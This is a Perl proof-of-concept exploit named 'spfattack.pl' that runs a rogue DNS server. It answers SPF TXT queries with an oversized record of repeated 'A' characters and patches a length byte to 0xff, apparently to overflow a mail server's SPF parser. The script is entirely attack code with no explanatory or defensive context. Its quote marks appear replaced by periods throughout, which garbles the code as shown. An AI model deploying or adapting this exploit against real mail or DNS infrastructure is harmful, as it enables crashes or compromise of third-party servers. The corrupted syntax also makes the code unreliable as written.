# cat spfattack.pl
#!/usr/bin/perl
#

use Net::DNS;
use IO::Socket::INET;
use Data::HexDump;
my $qclass = .IN.;
my $ttl = 10;

while (1){
   my $sock = IO::Socket::INET->new(
                                 LocalPort => .53.,
                                 Proto     => .udp.);
   $sock->recv($newmsg, 2048);
   my $req    = Net::DNS::Packet->new(\$newmsg);
   $req->print;
   my $id = $req->header->id();
   my @q = $req->question;
   my $qname = $q[0]->qname;
   my $qtype = $q[0]->qtype;
   if($qtype eq .PTR.) { next; }
   $answer = Net::DNS::Packet->new($qname, $qtype);
   if($qtype eq .TXT.){
      $answer->push(answer => Net::DNS::RR->new(.$qname 0 $qclass $qtype .v=spf1 mx +all..));
      $answer->push(answer => Net::DNS::RR->new(.$qname 0 $qclass $qtype .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAA..));
   }
   if($qtype eq .MX.){}

   $answer->header->id($id);
   $answer->header->aa(1);
   $answer->header->qr(1);
   $answer->print;
   my $port =  $sock->peerport;
   my $peer = inet_ntoa($sock->peeraddr);

   $sock->shutdown(2);
   $sock = ..;

   my $tempsock  = IO::Socket::INET->new(
                                         LocalPort=>.53.,
                                         PeerAddr=>.$peer.,
                                         PeerPort=>$port,
                                         Proto=>.udp.);
   my $newans;

   $newans = $answer->data;
   if($qtype eq .TXT.){
     substr($newans, 44, 1, pack(.c.,0xff));
     print HexDump $newans;
   }
   $tempsock->send($newans);
   #my $packet = Net::DNS::Packet->new(\$newmsg);
}
